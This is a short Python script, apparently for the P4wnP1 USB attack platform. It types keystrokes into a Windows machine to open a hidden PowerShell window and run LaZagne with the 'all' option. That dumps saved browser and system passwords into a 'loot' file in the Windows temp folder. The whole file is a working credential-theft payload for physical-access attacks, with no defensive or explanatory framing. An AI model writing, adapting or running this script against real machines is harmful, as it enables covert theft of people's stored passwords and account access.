#!/usr/bin/env python3
import os, sys, time, pathlib
P4WN_HOME = os.environ.get("P4WN_HOME","/opt/p4wnp1")
sys.path.insert(0, str(pathlib.Path(P4WN_HOME)/"tools"))
from hid_type import win_r, type_string

TOOL = os.getenv("BROWSER_TOOL", r"C:\Windows\Temp\LaZagne.exe")
OUTD = os.getenv("LOOT_DIR",    r"C:\Windows\Temp")
CMD  = os.getenv("BROWSER_ARGS", "all")

def main():
    print("[*] Launching browser dump wrapper")
    win_r(); time.sleep(0.4)
    type_string("powershell -nop -w hidden\n"); time.sleep(0.4)
    # If tool path is on MSD (e.g. E:\LaZagne.exe), user can set BROWSER_TOOL env before running
    type_string(fr"& '{TOOL}' {CMD} > '{OUTD}\browsers.txt' 2>&1\n")
    print("[*] Triggered tool:", TOOL)
    print("[*] Output ->", OUTD + r"\browsers.txt")
if __name__ == "__main__": main()
